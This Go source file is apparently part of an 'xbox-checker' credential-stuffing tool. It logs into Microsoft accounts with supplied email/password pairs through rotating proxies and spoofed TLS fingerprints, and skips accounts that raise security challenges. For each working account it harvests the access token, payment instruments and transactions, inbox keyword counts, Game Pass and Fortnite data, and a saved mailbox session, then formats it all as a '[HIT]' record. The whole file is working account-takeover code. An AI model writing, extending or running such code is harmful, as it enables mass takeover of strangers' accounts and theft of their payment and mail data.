package xbox

import (
	"encoding/json"
	"fmt"
	http "github.com/bogdanfinn/fhttp"
	"io"
	"net/url"
	"regexp"
	"strings"
	"time"

	"xbox-checker/internal/checkercfg"
	"xbox-checker/internal/epic"
	"xbox-checker/internal/mail"
	"xbox-checker/internal/nettls"
	"xbox-checker/internal/payments"
	"xbox-checker/internal/promos"
	"xbox-checker/internal/proxy"
)

// ExecuteAccountValidation runs the full-capture login flow for one account:
// Microsoft login, payment instruments + transactions, keyword inbox search,
// Game Pass promos, Fortnite locker and account-type classification.
// Returns: formattedHit, isValid, logMsg, shouldRetry.
//
// Every soft (retryable) failure carries a reason in logMsg so the activity
// log can say WHY a line keeps failing (dead proxy, block, rate limit)
// instead of silently retrying into an unexplained "attempts exhausted".

// reCredInText matches scheme://user:pass@ inside error strings.
var reCredInText = regexp.MustCompile(`(?i)([a-z][a-z0-9+.\-]*://)[^/@\s]+@`)

// softReason formats a retryable network failure for the log. Proxied
// request errors can embed the full proxy URL — credentials are masked so
// they can never leak into the activity stream.
func softReason(stage string, err error) string {
	return stage + " failed: " + reCredInText.ReplaceAllString(err.Error(), "$1***@")
}

// challengeMarkers are Microsoft interrupt/challenge pages. No amount of
// proxy retrying gets past them: they used to fall through to the generic
// "no access token" retry, burn the whole 3-proxy budget and then die as a
// done line, hiding what actually happened.
var challengeMarkers = []string{
	"verify your identity",
	"help us protect your account",
	"let's protect your account",
	"unusual activity",
	"additional security",
	"verification code",
	"enter the code",
	"security code",
	"approve sign in",
	"authenticator notification",
	"proofup",
	"ffcchallenge",
	"confirm your identity",
}

// challengePage reports whether body is a Microsoft interrupt page rather
// than a completed (or credential-rejected) sign-in.
func challengePage(body string) bool {
	low := strings.ToLower(body)
	for _, m := range challengeMarkers {
		if strings.Contains(low, m) {
			return true
		}
	}
	return strings.Contains(body, "Sign in to your Microsoft account") && strings.Contains(body, "proof")
}
func ExecuteAccountValidation(email, password, proxyStr string, proxies []string, keywords []string, wfp *nettls.FP, cfg checkercfg.Config) (string, bool, string, bool) {
	if wfp == nil {
		wfp = nettls.NewWorkerFP(0)
	}
	preset := wfp.NextPreset()
	client, oauthClient := nettls.NewPairProfile(proxyStr, 5*time.Second, 5*time.Second, preset.Profile)
	if client == nil {
		return "", false, "proxy setup failed — could not create the HTTP client", true
	}
	ua := preset.UA
	profile := preset.Profile

	reqInit, err := http.NewRequest("GET", PreflightURL, nil)
	if err != nil {
		return "", false, "", true // soft – retry
	}
	reqInit.Header.Set("User-Agent", ua)

	respInit, err := nettls.Do(client, reqInit)
	if err != nil {
		return "", false, softReason("preflight", err), true // network / proxy – retry
	}
	bodyInitBytes, _ := io.ReadAll(respInit.Body)
	respInit.Body.Close()
	ppft := nettls.ExtractPPFT(string(bodyInitBytes))

	if ppft == "" {
		// No PPFT means login.live.com served something other than the login
		// form — an IP/proxy block, a rate limit, or a changed page.
		return "", false, fmt.Sprintf(
			"preflight returned no PPFT (status %d, %d bytes) — proxy flagged or rate-limited",
			respInit.StatusCode, len(bodyInitBytes)), true
	}

	loginData := url.Values{}
	loginData.Set("i13", "0")
	loginData.Set("login", email)
	loginData.Set("loginfmt", email)
	loginData.Set("type", "11")
	loginData.Set("LoginOptions", "3")
	loginData.Set("passwd", password)
	loginData.Set("ps", "2")
	loginData.Set("PPFT", ppft)
	loginData.Set("NewUser", "1")
	loginData.Set("IsFidoSupported", "1")
	loginData.Set("i19", "36463")

	reqPost, err := http.NewRequest("POST", LoginPostURL, strings.NewReader(loginData.Encode()))
	if err != nil {
		return "", false, "", true
	}
	reqPost.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqPost.Header.Set("Origin", "https://login.live.com")
	reqPost.Header.Set("Referer", PreflightURL)

	respPost, err := nettls.Do(client, reqPost)
	if err != nil {
		return "", false, softReason("login", err), true // POST network – retry
	}
	defer respPost.Body.Close()
	bodyBytes, _ := io.ReadAll(respPost.Body)
	bodyStr := string(bodyBytes)

	if strings.Contains(bodyStr, "Your account or password is incorrect") ||
		strings.Contains(bodyStr, "That Microsoft account doesn't exist") {
		// Hard fail – do not retry
		return "", false, fmt.Sprintf("[%s] INVALID: Credentials incorrect.", email), false
	}

	if challengePage(bodyStr) {
		// Extra proof / challenge – discard, do not retry. Previously this
		// only matched when the page contained BOTH "Sign in to your
		// Microsoft account" AND "proof", so every other interrupt page
		// burned proxy retries and ended as a done line.
		return "", false, fmt.Sprintf("[%s] SKIP: Microsoft demanded extra verification.", email), false
	}

	reqAuth, err := http.NewRequest("GET", OAuthAuthorizeURL, nil)
	if err != nil {
		return "", false, "", true
	}

	if oauthClient == nil {
		oauthClient = nettls.NewClientProfile(proxyStr, 5*time.Second, false, profile)
		if oauthClient == nil {
			return "", false, "proxy setup failed — could not create the OAuth client", true
		}
		oauthClient.SetCookieJar(client.GetCookieJar())
	}

	respAuth, err := nettls.Do(oauthClient, reqAuth)
	if err != nil {
		return "", false, softReason("oauth", err), true // OAuth network – retry
	}
	defer respAuth.Body.Close()

	loc := respAuth.Header.Get("Location")
	atk := nettls.ExtractParam(loc, "access_token=")

	if atk == "" {
		authBody, _ := io.ReadAll(respAuth.Body)
		probe := loc + "\n" + string(authBody)
		if challengePage(probe) {
			// An interrupt page, not a flaky proxy: terminal skip so it does
			// not burn the proxy budget and end as a done line.
			return "", false, fmt.Sprintf("[%s] SKIP: Microsoft demanded extra verification.", email), false
		}
		if strings.Contains(probe, "error=interaction_required") ||
			strings.Contains(probe, "error=consent_required") {
			// Account-state consent/interaction prompts cannot be satisfied
			// by another proxy either — skip instead of retrying to death.
			return "", false, fmt.Sprintf("[%s] SKIP: Microsoft wants sign-in interaction.", email), false
		}
		// Genuinely no token (rate limit, block, transient): retry with the
		// next proxy — but now with an honest reason and status code.
		return "", false, fmt.Sprintf("sign-in returned no access token (oauth status %d) — rejected or rate-limited", respAuth.StatusCode), true
	}

	// Fetch Payment Instruments & Transactions
	reqPay, err := http.NewRequest("GET", PaymentInstrumentsURL, nil)
	var payStr string
	if err == nil {
		reqPay.Header.Set("Authorization", fmt.Sprintf("MSADELEGATE1.0=\"%s\"", atk))
		reqPay.Header.Set("Accept", "application/json")
		if respPay, err := nettls.Do(client, reqPay); err == nil {
			defer respPay.Body.Close()
			payBytes, _ := io.ReadAll(respPay.Body)
			payStr = string(payBytes)
		}
	}
	if !cfg.CapPayments {
		payStr = ""
	}

	cashStrs, nonCashActive, removedMethods, countryName := payments.Parse(payStr)

	reqTx, err := http.NewRequest("GET", PaymentTransactionsURL, nil)
	var txStr string
	if err == nil {
		reqTx.Header.Set("Authorization", fmt.Sprintf("MSADELEGATE1.0=\"%s\"", atk))
		reqTx.Header.Set("Accept", "application/json")
		if respTx, err := nettls.Do(client, reqTx); err == nil {
			defer respTx.Body.Close()
			txBytes, _ := io.ReadAll(respTx.Body)
			txStr = string(txBytes)
		}
	}

	services := payments.DetectActiveServices(txStr)

	// ---------- Inbox keyword search (additional step) ----------
	keywordResults := ""
	if cfg.CapKeywords && len(keywords) > 0 {
		counts := mail.SearchInboxForKeywords(email, password, proxyStr, keywords)
		var parts []string
		for _, kw := range keywords {
			if counts[kw] <= 0 {
				continue
			}
			parts = append(parts, fmt.Sprintf("%s %d", strings.TrimSpace(kw), counts[kw]))
		}
		if len(parts) > 0 {
			keywordResults = "Keywords: " + strings.Join(parts, ", ")
		}
	}

	// Formatting Output
	var middleParts []string
	middleParts = append(middleParts, email)
	middleParts = append(middleParts, password)

	if len(cashStrs) > 0 {
		middleParts = append(middleParts, strings.Join(cashStrs, " | "))
	}

	var activePart string
	if len(nonCashActive) > 0 {
		activePart = fmt.Sprintf("Active: [%s]", strings.Join(nonCashActive, " | "))
	} else {
		activePart = "Active: No Active Payment Methods"
	}
	middleParts = append(middleParts, activePart)

	if len(removedMethods) > 0 {
		removedPart := fmt.Sprintf("Inactive: Removed: [%s]", strings.Join(removedMethods, " | "))
		middleParts = append(middleParts, removedPart)
	}

	middleParts = append(middleParts, fmt.Sprintf("Country: %s", countryName))
	middleParts = append(middleParts, fmt.Sprintf("Services: %s", services))

	if keywordResults != "" {
		middleParts = append(middleParts, keywordResults)
	}

	if cfg.CapPromos {
		if promoLine := promos.CheckGamePass(email, password, proxyStr); promoLine != "" {
			middleParts = append(middleParts, promoLine)
		}
	}

	// ---------- Fortnite / Epic locker step ----------
	fnInfo := ""
	if cfg.CapFortnite {
		fnInfo = epic.CheckAccount(email, password, proxyStr)
		for attempt := 0; attempt < 3 && epic.Retryable(fnInfo); attempt++ {
			next := proxyStr
			if len(proxies) > 0 {
				// Round-robin through the LIVE pool (same health state the
				// checker uses) instead of walking cfg.Proxies by index,
				// which could re-hand a proxy the checker marked dead.
				next = proxy.TakeLive("check", proxies)
			}
			fnInfo = epic.CheckAccount(email, password, next)
		}
		if epic.Retryable(fnInfo) {
			// The capture is still incomplete after its own retries. The
			// account must NOT be appended to valid.txt with a failed step:
			// return it as a soft failure so the engine retries it with a
			// fresh proxy (and, if it never succeeds, it fails instead of
			// being recorded as valid).
			return "", false, fmt.Sprintf("[%s] RETRY: Fortnite check failed after proxy retries", email), true
		}
	}
	if fnInfo != "" {
		middleParts = append(middleParts, fnInfo)
	}

	acctType := ClassifyAccountType(email, proxyStr)
	if acctType != "" {
		middleParts = append(middleParts, "Account Type: "+acctType)
	}

	// Save a mailbox token for this freshly checked account so the Email
	// Viewer opens it via the saved token first; proxies stay the fallback.
	mail.CaptureOutlookSession(client, oauthClient, ua, email)

	formattedResult := strings.Join(middleParts, " | ")
	hitKind := "[HIT]"
	if strings.EqualFold(acctType, "Free") {
		hitKind = "[Free Hit]"
	} else if strings.EqualFold(acctType, "Private") {
		hitKind = "[Private Hit]"
	}
	return formattedResult, true, fmt.Sprintf("%s Successful validation for %s", hitKind, email), false
}

// jsonUnused keeps the json import meaningful if the flow is trimmed.
var _ = json.Marshal
